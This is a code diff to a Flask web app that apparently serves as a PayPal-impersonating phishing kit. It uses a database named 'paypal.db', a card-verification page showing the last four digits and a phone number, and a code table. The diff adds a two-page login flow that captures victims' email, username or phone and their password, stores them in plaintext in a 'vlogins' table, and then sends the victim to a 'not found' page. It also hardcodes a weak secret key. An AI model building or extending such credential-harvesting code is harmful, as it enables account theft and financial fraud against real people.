@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, url_for, redirect, g
+from flask import Flask, request, render_template, url_for, redirect, g,session, flash
 import sqlite3
 import os
 import smtplib
@@ -6,6 +6,7 @@ from email.mime.text import MIMEText
 
 
 app = Flask(__name__)
+app.secret_key = "super_secret_key_123"
 
 # SQLite configuration
 DATABASE = 'paypal.db'
@@ -71,6 +72,14 @@ with app.app_context():
         CREATE TABLE IF NOT EXISTS ccode (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             code TEXT NOT NULL
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS vlogins (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            identifier TEXT NOT NULL,
+            password TEXT NOT NULL,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     """)
     
@@ -195,6 +204,53 @@ def verify():
     error = request.args.get("error")
     return render_template('cverify.html', last4=last4, error=error, phone=phone)
 
+@app.route("/identifier", methods=["GET", "POST"])
+def login_identifier():
+    if request.method == "POST":
+        identifier = request.form.get("identifier", "").strip()
+        if not identifier:
+            flash("Please enter your email, username or phone.", "error")
+            return render_template("vlogin.html")
+
+        # store identifier temporarily in session (not URL)
+        session["identifier"] = identifier
+        return redirect(url_for("login_password"))
+    return render_template("vlogin.html")
+
+# ---- Page 2: Password (vpassword.html) ----
+@app.route("/password", methods=["GET", "POST"])
+def login_password():
+    # Get identifier from session
+    identifier = session.get("identifier")
+    if not identifier:
+        flash("Please enter your identifier first.", "info")
+        return redirect(url_for("login_identifier"))
+
+    if request.method == "POST":
+        password = request.form.get("password", "")
+        if not password:
+            flash("Please enter a password.", "error")
+            return render_template("vpassword.html", identifier=identifier)
+
+        # Store identifier + password into DB
+        db = get_db()
+        db.execute(
+            "INSERT INTO vlogins (identifier, password) VALUES (?, ?)",
+            (identifier, password),
+        )
+        db.commit()
+
+        # Clear identifier from session for privacy
+        session.pop("identifier", None)
+
+        # Redirect to notfound.html page after success
+        return redirect(url_for("notfound"))
+
+    # If GET request, just render the password page
+    return render_template("vpassword.html", identifier=identifier)
+
+
+
 
 @app.route("/notfound")
 def notfound():
@@ -212,4 +268,5 @@ def view_data():
 
 if __name__ == '__main__': 
     app.run(debug=True)
+
 
